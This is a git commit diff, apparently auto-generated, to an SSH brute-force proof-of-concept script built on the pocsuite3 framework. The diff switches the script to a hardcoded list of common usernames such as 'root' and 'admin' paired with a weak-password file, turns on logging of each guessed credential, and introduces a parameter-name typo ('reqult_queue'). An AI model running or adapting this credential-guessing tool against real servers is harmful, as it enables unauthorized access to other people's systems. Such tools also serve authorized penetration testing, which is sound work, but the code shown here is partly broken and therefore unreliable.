a51a877721670eb281cbe3359d7aa56559a3649a
test <test>
2023-04-14 03:08:49 +0000

    auto updated

--- poc/ssh_burst.py
+++ poc/ssh_burst.py
@@ -1,7 +1,7 @@
 """
 If you have issues about development, please read:
 https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
-for more about information, plz visit https://pocsuite.org
+for more about information, plz visit http://pocsuite.org
 """
 
 import itertools
@@ -74,9 +74,9 @@ class DemoPOC(POCBase):
 
 
 def get_word_list():
-    with open(paths.SSH_USER) as username:
-        with open(paths.SSH_PASS) as password:
-            return itertools.product(username, password)
+    common_username = ('ssh', 'test', 'root', 'guest', 'admin', 'daemon', 'user')
+    with open(paths.WEAK_PASS) as f:
+        return itertools.product(common_username, f)
 
 
 def port_check(host, port=22):
@@ -105,7 +105,7 @@ def ssh_login(host, port, username, password):
     return ret
 
 
-def task_init(host, port, task_queue, result_queue):
+def task_init(host, port, task_queue, reqult_queue):
     for username, password in get_word_list():
         task_queue.put((host, port, username.strip(), password.strip()))
 
@@ -113,8 +113,8 @@ def task_init(host, port, task_queue, result_queue):
 def task_thread(task_queue, result_queue):
     while not task_queue.empty():
         host, port, username, password = task_queue.get()
-        # logger.info('try burst {}:{} use username:{} password:{}'.format(
-        #     host, port, username, password))
+        logger.info('try burst {}:{} use username:{} password:{}'.format(
+            host, port, username, password))
         if ssh_login(host, port, username, password):
             with task_queue.mutex:
                 task_queue.queue.clear()
